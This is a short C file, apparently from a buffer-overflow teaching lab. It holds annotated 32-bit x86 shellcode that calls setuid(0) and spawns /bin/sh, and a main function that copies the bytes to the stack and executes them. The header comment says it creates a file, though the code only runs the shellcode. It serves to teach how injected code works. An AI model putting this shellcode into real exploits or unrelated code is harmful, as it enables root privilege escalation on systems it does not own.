/* call_shellcode.c  */
/*A program that creates a file containing code for launching shell*/
#include <string.h>
char code[] =
  // setuid(0)
  "\x31\xdb"          /* Line 1:  xorl   %ebx,%ebx   */
  "\x31\xc0"          /* Line 3:  xorl   %eax,%eax   */
  "\xb0\xd5"          /* Line 4:  movb   $0xd5,%al   */
  "\xcd\x80"          /* Line 5:  int    $0x80       */

  // execve(/bin//sh)
  "\x31\xc0"          /* Line 1:  xorl   %eax,%eax   */ 
  "\x50"              /* Line 2:  pushl  %eax        */
  "\x68""//sh"        /* Line 3:  pushl  $0x68732f2f */
  "\x68""/bin"        /* Line 4:  pushl  $0x6e69622f */
  "\x89\xe3"          /* Line 5:  movl   %esp,%ebx   */
  "\x50"              /* Line 6:  pushl  %eax        */
  "\x53"              /* Line 7:  pushl  %ebx        */
  "\x89\xe1"          /* Line 8:  movl   %esp,%ecx   */
  "\x99"              /* Line 9:  cdql               */
  "\xb0\x0b"          /* Line 10: movb   $0x0b,%al   */
  "\xcd\x80"          /* Line 11: int    $0x80       */
  ;

int main(int argc, char **argv)
{
  char buf[sizeof(code)];
  strcpy(buf, code);
  ((void(*)( ))buf)( );
}
